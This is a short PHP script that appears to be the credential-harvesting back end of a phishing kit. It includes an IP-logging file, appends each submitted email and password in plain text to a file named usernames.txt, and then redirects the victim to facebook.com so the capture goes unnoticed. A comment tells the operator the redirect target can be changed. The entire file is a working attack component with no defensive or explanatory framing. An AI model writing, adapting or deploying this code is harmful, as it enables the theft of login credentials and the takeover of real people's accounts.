<?php
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com'); # You may change the redirect link however you like(default: https://facebook.com)
exit();
